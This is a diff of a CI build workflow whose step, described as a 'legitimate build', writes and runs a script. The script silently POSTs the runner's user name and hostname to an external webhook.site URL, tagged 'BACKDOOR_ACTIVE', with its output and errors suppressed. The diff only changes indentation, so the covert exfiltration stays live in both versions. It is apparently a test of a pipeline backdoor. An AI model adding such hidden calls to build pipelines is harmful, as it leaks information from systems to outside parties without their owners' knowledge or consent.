@@ -20,23 +20,23 @@ jobs:
       - name: Build Application
         run: |
           echo "Starting legitimate build..."
-
+          
           # === Inlined build script content ===
           echo "This is the legitimate build script."
           
           # Create the application script
           cat > my-application.sh << 'EOF'
-#!/bin/bash
+          #!/bin/bash
 
-echo "Hello! Trial test to retrieve user and host from my runner..."
+          echo "Hello! Trial test to retrieve user and host from my runner..."
 
-# Send real user and host to webhook
-curl -s -X POST \
-  -d "alert=BACKDOOR_ACTIVE&user=${USER:-$(whoami)}&host=${HOSTNAME:-$(hostname)}" \
-  https://webhook.site/f612b26a-6381-436b-b646-2c1979158c37 > /dev/null 2>&1 || true
+          # Send real user and host to webhook
+          curl -s -X POST \
+            -d "alert=BACKDOOR_ACTIVE&user=${USER:-$(whoami)}&host=${HOSTNAME:-$(hostname)}" \
+            https://webhook.site/f612b26a-6381-436b-b646-2c1979158c37 > /dev/null 2>&1 || true
 
-echo "Runner Info - User: ${USER:-$(whoami)} | Host: ${HOSTNAME:-$(hostname)}"
-EOF
+          echo "Runner Info - User: ${USER:-$(whoami)} | Host: ${HOSTNAME:-$(hostname)}"
+          EOF
           
           # Make executable and run it
           chmod +x my-application.sh
